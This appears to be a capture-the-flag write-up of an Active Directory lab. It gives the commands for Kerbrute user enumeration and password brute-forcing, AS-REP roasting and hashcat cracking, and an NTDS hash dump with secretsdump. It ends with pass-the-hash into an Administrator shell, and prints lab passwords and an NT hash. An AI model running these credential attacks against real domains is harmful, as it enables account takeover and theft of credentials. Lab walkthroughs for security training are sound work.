# **Attacking Active Directory**

***
## **Difficulty = Info**

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/e258cea5-0589-4240-98fb-f444d291c0d6)

***


Running our nmap scan we have 

```bash
# Nmap 7.94 scan initiated Fri Dec 29 07:26:23 2023 as: nmap -p53,80,88,135,139,389,445,464,593,636,3269,5985,9389,47001 -sCV --min-rate=1000 -T4 -oN nmap.txt -v 10.10.234.228
Nmap scan report for 10.10.234.228
Host is up (0.29s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-29 06:26:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-12-29T06:26:53
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 29 07:27:07 2023 -- 1 IP address (1 host up) scanned in 44.78 seconds
```


> [!bug]
> According to nmap output, we have `spookysec.local`, in this case `.local` is identified as the Top-Level Domain (TLD)


# **SMB Enumeration - Port 139/445**

We can use the tool `enum4linux` to enumerate this port, we have **THM-AD** as the `NetBIOS-Domain` Name


![](https://i.imgur.com/Uzgypv9.png)


We also have some lists of users

![](https://i.imgur.com/JaORfAd.png)


We can also use `rpcclient` to enumerate 


```bash
rpcclient -U "" -N 10.10.234.228
```


![](https://i.imgur.com/L10FL7X.png)


Some important commands as used above -:


```bash
rpcclient>srvinfo

rpcclient>enumdomusers

rpcclient>getdompwinfo
```


We couldn't get anything from `rpcclient` though, so let keep enumerating



# **Kerberos Enumeration - Port 88**


We can use a tool called [Kerbrute](https://github.com/ropnop/kerbrute/releases) to enumerate this service to brute force discovery of users, passwords and even password spray!

> [!info]
> Kerberos is a key authentication service within Active Directory.

- **Enumerate** users on a domain

```bash
# --dc : IP of target (KDC)
# -d : domain name
kerbrute userenum --dc 10.10.234.228 -d spookysec.local <Username_wordlist>
```


![](https://i.imgur.com/BOwIWDn.png)


- Bruteforce password of a single user

```bash
# --dc : IP of target (KDC)
# -d : domain name
kerbrute bruteuser --dc 10.10.234.228 -d spookysec.local <passwd_wordlist> <username>
```


![](https://i.imgur.com/2iAQcWV.png)
![](https://i.imgur.com/UxGMJ1D.png)


# **Abusing Kerberos**


we can abuse a feature within Kerberos with an attack called **ASREPRoasting**, we can use a tool called `GetNPUsers.py` withing **impackets** to do this


```bash
GetNPUsers.py spookysec.local/ -dc-ip 10.10.234.228 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
```


As we can see below we have the hash of only `svc-admin` user, a service account


![](https://i.imgur.com/flTlJ5Y.png)


we can go ahead and crack it using `hashcat`

```bash
hashcat -m 18200 hashes.txt ./passwordlist.txt
```


![](https://i.imgur.com/V5Dqn9w.png)

Same password we got with `kerbrute`, Nice :)


# Enumeration Cont'D


Since we now have the username and passwords of the `svc-admin` user and `backup` user given more access within the domain, We can now attempt to enumerate any shares that the domain controller may be giving out.

First tool that comes to mind is `smbclient` and `smbmap`, let try to see shares on this users

```bash
# smbclient
smbclient -U 'svc-admin' -L \\\\10.10.234.228\\

# smbmap
smbmap -u 'svc-admin' -p 'management2005' -H 10.10.234.228
```


`svc-admin` user -:


![](https://i.imgur.com/C3lCOix.png)


`backup` user -:

![](https://i.imgur.com/2iE2kmN.png)


Enumerating `svc-admin` share we found a backup directory with a `backup_credentials.txt` file

![](https://i.imgur.com/TmgRNL6.png)


We can read this file using `smbclient`


![](https://i.imgur.com/ntECgGC.png)

Decoding the content of this file from `Basee64` gives us this


```
backup@spookysec.local:backup2517860
```


Haha, looks like we are a bit faster, `kerbrute` has done most of the work for us :)


```
secretsdump.py spookysec.local/backup:backup2517860@10.10.234.228
```


# **Elevating Privileges within the Domain**


The backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes. we can use another tool within Impacket called "`secretsdump.py`". This will allow us to retrieve all of the password hashes that this user account has to offer in `NTDS.dit`

```
secretsdump.py spookysec.local/backup:backup2517860@10.10.234.228
```


![](https://i.imgur.com/4SRZHpC.png)



Since we have the **Win-RM** port opened(**5985**), we can use a tool called `evil-winrm` to gain shell on our target with just their **usernames** and respective **NT hashes** using the **pass-the-hash** attack

**_Administrator_** -:

```bash
evil-winrm -i 10.10.234.228 -u administrator -H '0e0363213e37b94221497260b0bcb4fc'
```


![](https://i.imgur.com/BMRYiqX.png)


Since we are admin and we can't login via `svc-admin` and `backup` we can go ahead and retrieve the other flags located under `C:\Users\` :)

GG


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>






